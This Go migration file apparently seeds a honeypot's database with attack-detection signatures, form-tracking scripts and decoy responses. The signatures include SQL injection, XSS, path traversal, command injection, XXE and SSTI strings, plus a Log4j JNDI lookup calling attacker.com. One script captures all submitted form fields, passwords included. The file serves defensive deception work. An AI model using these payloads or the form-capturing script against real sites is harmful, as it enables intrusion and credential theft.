package database

import (
	"database/sql"
	"log"
)

// RunMigrations executes all pending database migrations
func RunMigrations(db *sql.DB) error {
	// Migration 1: Seed attack patterns
	if err := seedAttackPatterns(db); err != nil {
		log.Printf("Warning: Could not seed attack patterns: %v", err)
		// Don't fail on seed errors, just log
	}

	// Migration 2: Seed default intel collection templates
	if err := seedIntelTemplates(db); err != nil {
		log.Printf("Warning: Could not seed intel templates: %v", err)
	}

	// Migration 3: Seed default payloads
	if err := seedPayloadTemplates(db); err != nil {
		log.Printf("Warning: Could not seed payloads: %v", err)
	}

	return nil
}

// seedAttackPatterns inserts known attack patterns into the database
func seedAttackPatterns(db *sql.DB) error {
	// Check if patterns already exist
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM attack_patterns WHERE created_by = 'seed'").Scan(&count)
	if err != nil {
		return err
	}

	// If patterns already seeded, skip
	if count > 0 {
		log.Printf("Attack patterns already seeded (%d patterns)", count)
		return nil
	}

	log.Println("Seeding attack patterns...")

	patterns := []struct {
		appID          string
		signature      string
		attackType     string
		classification string
		method         string
		pathPattern    string
		responseCode   int
		confidence     float64
	}{
		// Reconnaissance and Enumeration
		{"default", "/.env", "reconnaissance", "env_probe", "GET", "/.env", 403, 0.95},
		{"default", "/.env.local", "reconnaissance", "env_probe", "GET", "/.env.local", 403, 0.95},
		{"default", "/.env.prod", "reconnaissance", "env_probe", "GET", "/.env.prod", 403, 0.95},
		{"default", "/.env.production", "reconnaissance", "env_probe", "GET", "/.env.production", 403, 0.95},
		{"default", "/.git", "reconnaissance", "source_enumeration", "GET", "/.git", 403, 0.92},
		{"default", "/.git/config", "reconnaissance", "source_enumeration", "GET", "/.git/config", 403, 0.94},
		{"default", "/.gitignore", "reconnaissance", "source_enumeration", "GET", "/.gitignore", 403, 0.90},
		{"default", "/.github", "reconnaissance", "source_enumeration", "GET", "/.github", 403, 0.88},
		{"default", "/config", "reconnaissance", "directory_enumeration", "GET", "/config", 403, 0.85},
		{"default", "/admin", "reconnaissance", "directory_enumeration", "GET", "/admin", 403, 0.88},
		{"default", "/admin.php", "reconnaissance", "directory_enumeration", "GET", "/admin.php", 403, 0.90},
		{"default", "/wp-admin", "reconnaissance", "cms_probe", "GET", "/wp-admin", 403, 0.92},
		{"default", "/wp-login", "reconnaissance", "cms_probe", "GET", "/wp-login", 403, 0.92},
		{"default", "/wp-login.php", "reconnaissance", "cms_probe", "GET", "/wp-login.php", 403, 0.93},
		{"default", "/xmlrpc.php", "reconnaissance", "cms_probe", "GET", "/xmlrpc.php", 403, 0.88},
		{"default", "/backup", "reconnaissance", "directory_enumeration", "GET", "/backup", 403, 0.85},
		{"default", "/backup.zip", "reconnaissance", "backup_enumeration", "GET", "/backup.zip", 403, 0.92},
		{"default", "/api", "reconnaissance", "api_enumeration", "GET", "/api", 403, 0.80},
		{"default", "/api/v1", "reconnaissance", "api_enumeration", "GET", "/api/v1", 403, 0.82},
		{"default", "/phpmyadmin", "reconnaissance", "cms_probe", "GET", "/phpmyadmin", 403, 0.92},
		{"default", "/cpanel", "reconnaissance", "cms_probe", "GET", "/cpanel", 403, 0.90},
		{"default", "/plesk", "reconnaissance", "cms_probe", "GET", "/plesk", 403, 0.89},

		// SQL Injection Attempts
		{"default", "sql_injection_basic", "sql_injection", "sqli_attempt", "GET", "?id=1' OR '1'='1", 403, 0.96},
		{"default", "sql_injection_union", "sql_injection", "sqli_attempt", "GET", "?id=1 UNION SELECT", 403, 0.95},
		{"default", "sql_injection_time_based", "sql_injection", "sqli_attempt", "GET", "?id=1' AND SLEEP(5) AND '1'='1", 403, 0.94},
		{"default", "sql_injection_blind", "sql_injection", "sqli_attempt", "GET", "?id=1' AND '1'='1", 403, 0.92},
		{"default", "sql_injection_comment", "sql_injection", "sqli_attempt", "GET", "?id=1' OR 1=1 --", 403, 0.93},

		// Cross-Site Scripting (XSS)
		{"default", "xss_script_tag", "xss", "xss_attempt", "GET", "<script>alert(1)</script>", 403, 0.96},
		{"default", "xss_img_onerror", "xss", "xss_attempt", "GET", "<img src=x onerror=alert(1)>", 403, 0.95},
		{"default", "xss_svg_onload", "xss", "xss_attempt", "GET", "<svg onload=alert(1)>", 403, 0.94},
		{"default", "xss_iframe", "xss", "xss_attempt", "GET", "<iframe src=javascript:alert(1)>", 403, 0.93},
		{"default", "xss_event_handler", "xss", "xss_attempt", "GET", "\" onclick=\"alert(1)\"", 403, 0.91},

		// Path Traversal
		{"default", "path_traversal_basic", "path_traversal", "lfi_attempt", "GET", "../../../etc/passwd", 403, 0.96},
		{"default", "path_traversal_encoded", "path_traversal", "lfi_attempt", "GET", "..%2F..%2F..%2Fetc%2Fpasswd", 403, 0.94},
		{"default", "path_traversal_double_encoded", "path_traversal", "lfi_attempt", "GET", "..%252F..%252F..%252Fetc%252Fpasswd", 403, 0.92},
		{"default", "path_traversal_windows", "path_traversal", "lfi_attempt", "GET", "..\\..\\..\\windows\\system32", 403, 0.93},

		// Command Injection
		{"default", "command_injection_basic", "command_injection", "rce_attempt", "GET", "; cat /etc/passwd", 403, 0.95},
		{"default", "command_injection_pipe", "command_injection", "rce_attempt", "GET", "| whoami", 403, 0.93},
		{"default", "command_injection_and", "command_injection", "rce_attempt", "GET", "&& id", 403, 0.92},
		{"default", "command_injection_backtick", "command_injection", "rce_attempt", "GET", "`whoami`", 403, 0.91},

		// LDAP Injection
		{"default", "ldap_injection", "ldap_injection", "ldapi_attempt", "POST", "*)(uid=*", 403, 0.88},

		// XML External Entity (XXE)
		{"default", "xxe_external_entity", "xxe", "xxe_attempt", "POST", "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>", 403, 0.94},

		// Server-Side Template Injection (SSTI)
		{"default", "ssti_basic", "ssti", "template_injection", "GET", "{{7*7}}", 403, 0.85},
		{"default", "ssti_jinja", "ssti", "template_injection", "GET", "{{config.items()}}", 403, 0.87},
		{"default", "ssti_erb", "ssti", "template_injection", "GET", "<%= 7*7 %>", 403, 0.86},

		// Brute Force Attempts
		{"default", "brute_force_login", "brute_force", "auth_attack", "POST", "/login", 403, 0.90},
		{"default", "brute_force_admin", "brute_force", "auth_attack", "POST", "/admin/login", 403, 0.89},

		// Malicious Headers
		{"default", "malicious_user_agent_sqlmap", "malicious_header", "scanner_probe", "GET", "sqlmap", 403, 0.92},
		{"default", "malicious_user_agent_nikto", "malicious_header", "scanner_probe", "GET", "nikto", 403, 0.91},
		{"default", "malicious_user_agent_nmap", "malicious_header", "scanner_probe", "GET", "nmap", 403, 0.90},

		// Protocol-based Attacks
		{"default", "http_smuggling", "protocol_attack", "smuggling_attempt", "GET", "Content-Length: 13", 403, 0.88},

		// API-specific attacks
		{"default", "/api/users", "reconnaissance", "api_enumeration", "GET", "/api/users", 403, 0.80},
		{"default", "/api/admin", "reconnaissance", "api_enumeration", "GET", "/api/admin", 403, 0.81},

		// Null byte injection
		{"default", "null_byte_injection", "null_byte", "file_access", "GET", "%.php%00.txt", 403, 0.85},

		// Log4j CVE probes
		{"default", "log4j_jndi_basic", "log4j_exploit", "cve_probe", "GET", "${jndi:ldap://attacker.com/poc}", 403, 0.96},
	}

	stmt, err := db.Prepare(`
		INSERT INTO attack_patterns 
		(app_id, attack_signature, attack_type, attack_classification, http_method, path_pattern, response_code, times_seen, first_seen, last_seen, created_by, claude_confidence)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, datetime('now'), datetime('now'), 'seed', ?)
	`)
	if err != nil {
		return err
	}
	defer stmt.Close()

	for _, p := range patterns {
		_, err := stmt.Exec(p.appID, p.signature, p.attackType, p.classification, p.method, p.pathPattern, p.responseCode, 0, p.confidence)
		if err != nil {
			log.Printf("Warning: Could not seed pattern %s: %v", p.signature, err)
			continue
		}
	}

	log.Printf("Successfully seeded %d attack patterns", len(patterns))
	return nil
}

// seedIntelTemplates seeds default intel collection templates
func seedIntelTemplates(db *sql.DB) error {
	// Check if already seeded
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM intel_collection_templates WHERE created_by = 'seed'").Scan(&count)
	if err != nil {
		return err
	}

	if count > 0 {
		log.Printf("Intel templates already seeded (%d templates)", count)
		return nil
	}

	log.Println("Seeding intel collection templates...")

	templates := []struct {
		name        string
		templateType string
		content     string
		description string
	}{
		{
			name:         "tracking_javascript_v1",
			templateType: "javascript",
			content: `<script>
const tracker = {
  log: function(data) {
    fetch('/api/intel/log', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        event: data.event,
        timestamp: new Date(),
        userAgent: navigator.userAgent,
        data: data
      })
    }).catch(e => console.error('Tracking error:', e));
  }
};
window.addEventListener('load', function() {
  tracker.log({event: 'page_load'});
});
</script>`,
			description: "Basic JavaScript tracking payload",
		},
		{
			name:         "form_submission_tracker",
			templateType: "javascript",
			content: `<script>
document.addEventListener('submit', function(e) {
  const form = e.target;
  const formData = new FormData(form);
  const data = {};
  for (let [key, value] of formData.entries()) {
    data[key] = value;
  }
  fetch('/api/intel/log', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      event: 'form_submit',
      form_action: form.action,
      form_method: form.method,
      data: data,
      timestamp: new Date()
    })
  });
}, true);
</script>`,
			description: "Track form submissions",
		},
	}

	stmt, err := db.Prepare(`
		INSERT INTO intel_collection_templates 
		(name, template_type, content, description, is_active, created_at, created_by)
		VALUES (?, ?, ?, ?, 1, CURRENT_TIMESTAMP, 'seed')
	`)
	if err != nil {
		return err
	}
	defer stmt.Close()

	for _, t := range templates {
		_, err := stmt.Exec(t.name, t.templateType, t.content, t.description)
		if err != nil {
			log.Printf("Warning: Could not seed intel template %s: %v", t.name, err)
			continue
		}
	}

	log.Printf("Successfully seeded %d intel templates", len(templates))
	return nil
}

// seedPayloadTemplates seeds default payload templates
func seedPayloadTemplates(db *sql.DB) error {
	// Check if already seeded
	var count int
	err := db.QueryRow("SELECT COUNT(*) FROM payload_templates WHERE created_by = 'seed'").Scan(&count)
	if err != nil {
		return err
	}

	if count > 0 {
		log.Printf("Payload templates already seeded (%d templates)", count)
		return nil
	}

	log.Println("Seeding payload templates...")

	payloads := []struct {
		name        string
		attackType  string
		payloadType string
		content     string
		contentType string
		statusCode  int
		priority    int
	}{
		{
			name:        "env_probe_fake_credentials",
			attackType:  "reconnaissance",
			payloadType: "fixed",
			content: `DATABASE_URL=postgres://user:password@db.internal:5432/app
API_KEY=sk-1234567890abcdefghijklmnop
JWT_SECRET=super-secret-jwt-key-12345
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
ADMIN_PASSWORD=P@ssw0rd123!
DATABASE_PASSWORD=db_password_here`,
			contentType: "text/plain",
			statusCode:  200,
			priority:    95,
		},
		{
			name:        "sql_injection_fake_data",
			attackType:  "sql_injection",
			payloadType: "fixed",
			content: `[
  {"id": 1, "username": "admin", "email": "admin@example.com", "role": "administrator", "created_at": "2023-01-15"},
  {"id": 2, "username": "user", "email": "user@example.com", "role": "user", "created_at": "2023-02-20"},
  {"id": 3, "username": "guest", "email": "guest@example.com", "role": "guest", "created_at": "2023-03-10"}
]`,
			contentType: "application/json",
			statusCode:  200,
			priority:    95,
		},
		{
			name:        "xss_safe_response",
			attackType:  "xss",
			payloadType: "fixed",
			content:     `{"status": "success", "message": "Request processed", "data": {}}`,
			contentType: "application/json",
			statusCode:  200,
			priority:    95,
		},
		{
			name:        "path_traversal_fake_passwd",
			attackType:  "path_traversal",
			payloadType: "fixed",
			content: `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin`,
			contentType: "text/plain",
			statusCode:  200,
			priority:    95,
		},
		{
			name:        "admin_panel_redirect",
			attackType:  "reconnaissance",
			payloadType: "fixed",
			content:     `<html><head><title>Redirecting...</title><meta http-equiv="refresh" content="0;url=/login"></head><body>Redirecting to login...</body></html>`,
			contentType: "text/html",
			statusCode:  302,
			priority:    90,
		},
		{
			name:        "command_injection_fake_output",
			attackType:  "command_injection",
			payloadType: "fixed",
			content:     `uid=33(www-data) gid=33(www-data) groups=33(www-data)`,
			contentType: "text/plain",
			statusCode:  200,
			priority:    95,
		},
		{
			name:        "generic_forbidden",
			attackType:  "unknown",
			payloadType: "fixed",
			content:     `{"error": "Forbidden", "message": "Access denied", "code": 403}`,
			contentType: "application/json",
			statusCode:  403,
			priority:    1,
		},
	}

	stmt, err := db.Prepare(`
		INSERT INTO payload_templates 
		(name, attack_type, payload_type, content, content_type, http_status_code, priority, is_active, created_at, created_by)
		VALUES (?, ?, ?, ?, ?, ?, ?, 1, CURRENT_TIMESTAMP, 'seed')
	`)
	if err != nil {
		return err
	}
	defer stmt.Close()

	for _, p := range payloads {
		_, err := stmt.Exec(p.name, p.attackType, p.payloadType, p.content, p.contentType, p.statusCode, p.priority)
		if err != nil {
			log.Printf("Warning: Could not seed payload %s: %v", p.name, err)
			continue
		}
	}

	log.Printf("Successfully seeded %d payload templates", len(payloads))
	return nil
}
